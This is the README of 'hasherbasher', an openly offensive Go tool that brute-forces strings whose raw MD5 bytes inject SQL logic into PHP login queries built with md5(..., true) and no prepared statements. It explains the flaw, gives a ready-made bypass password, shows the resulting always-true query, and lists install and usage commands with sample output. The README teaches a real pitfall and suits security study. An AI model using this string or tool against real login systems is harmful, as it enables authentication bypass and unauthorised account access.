# hasherbasher

![Logo](https://images.propstore.com/90514.jpg)

This is a tool used to help exploit poorly designed authentication systems by locating ASCII strings that when MD5 hashed, result in raw bytes that could change SQL logic.

## How It Works

When constructing SQL queries for authentication, if a prepared statement is not used - a user can perform a SQL injection attack. For example:

```php
$query = "SELECT * FROM users WHERE email = '$_POST["email"]'"
```

This becomes complicated though when user input is hashed, such as in the case of a password:

```php
$email = mysql_real_escape_string($_POST["email"]);
$pass = md5($_POST["pass"], true);
$query = "SELECT * FROM users WHERE email = '$email' AND password_hash = '$pass'";
```

Here, the `$email` field is sanitized and prevents injection. But while the `$pass` value is not directly editable by the user, two fatal flaws exist:

1. The `md5()` function is using the parameter `raw_output = true`. This results in `$pass` being raw bytes instead of a string containing a hex encoded representation of the hash.
2. The query still is not using prepared statements for that parameter.

This results in the raw bytes of the `MD5(pass)` to be interpolated into the string, leaving PHP to determine encoding conversion.

HasherBasher attacks this directly. It attempts to brute force strings who's `MD5()` raw result would encode to a string that would include a SQL injection to bypass authentication used by the query above.

For example:

Given the string, `DyrhGOYP0vxI2DtH8y`, you could calculate an MD5 hash of `6c0e97fda5c225276f522735b381a25b`. But when used with `raw_output = true`, that looks like this:

```
[108 14 151 253 165 194 37 39 111 82 39 53 179 129 162 91]
```

In the middle of those bytes are the following:

```
39 111 82 39 53
'   o  R  '  5
```

So when you submit `$_POST['pass']` with the value of `DyrhGOYP0vxI2DtH8y`, the query above ends up with the following logic:

```sql
SELECT * FROM users WHERE email = '$email' AND password_hash = '...' OR '5'
```

Which evaluates to `true` for the where condition, so as long as an `email` of a valid user, you can login as that user.

## Features

**Incredibly fast.** Hasherbasher is generally able to brute around 5-10 million hashes per second on standard laptops. It's speed comes from three primary sources:

1. Golang's optimized compiler and crypto library
2. Parallelism via a worker pool and goroutines
3. Matching has been implemented as a finite state machine

So instead of incurring the overhead of regular expressions, it's able to locate matches orders of magnitude faster.

## Usage

```
$ go get github.com/gen0cide/hasherbasher
$ hasherbasher bruteforce

 ██░ ██  ▄▄▄        ██████  ██░ ██ ▓█████  ██▀███
▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄
░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░   ░     ░░   ░
 ░  ░  ░      ░  ░      ░   ░  ░  ░   ░  ░   ░
 ▄▄▄▄    ▄▄▄        ██████  ██░ ██ ▓█████  ██▀███
▓█████▄ ▒████▄    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
▒██▒ ▄██▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒███   ▓██ ░▄█ ▒
▒██░█▀  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄
░▓█  ▀█▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░▒████▒░██▓ ▒██▒
░▒▓███▀▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
▒░▒   ░   ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
 ░    ░   ░   ▒   ░  ░  ░   ░  ░░ ░   ░     ░░   ░
 ░            ░  ░      ░   ░  ░  ░   ░  ░   ░
 ░

[HASHERBASHER:cli]  INFO Configuration

 Minimum Length: 12
 Maximum Length: 24
    Parallelism: 12
 Stats Interval: 5

[HASHERBASHER:cli]  INFO Beginning brute force...
[HASHERBASHER:cli]  INFO Statistics

       Start Time: 10 Feb 19 19:30 -0800
 Elapsed Duration: now
   Total Attempts: 263
       Crack Rate: 1,525,796.40 per second
       Per Worker: 127,149.70 per worker per second

[HASHERBASHER:cli]  INFO ===== Match Found =====
[HASHERBASHER:cli]  INFO Cracked In: 0.000172369 seconds
[HASHERBASHER:cli]  INFO  -- BEGIN RAW BYTES --
l���%'oR'5���[
[HASHERBASHER:cli]  INFO  -- END RAW BYTES --
[HASHERBASHER:cli]  INFO ===== Results =====

 Located String: DyrhGOYP0vxI2DtH8y
    Result Size: 16
   Result Bytes: [108 14 151 253 165 194 37 39 111 82 39 53 179 129 162 91]
     Result Hex: 6c0e97fda5c225276f522735b381a25b

```

Command line options for the `bruteforce` subcommand are as follows:

```
OPTIONS:
   --min-string-length value  Minimum length of generated input strings
   --max-string-length value  Maximum length of generated input strings
   --parallelism value        Number of parallel brute force workers
   --interval value           Interval to print statistics in seconds
```

### Defaults

- `interval` = 5 seconds
- `parallelism` = number of CPUs
- `min-string-length` = 12
- `max-string-length` = 24

## Contact

- Alex Levinson (gen0cide.threats@gmail.com)

```

```
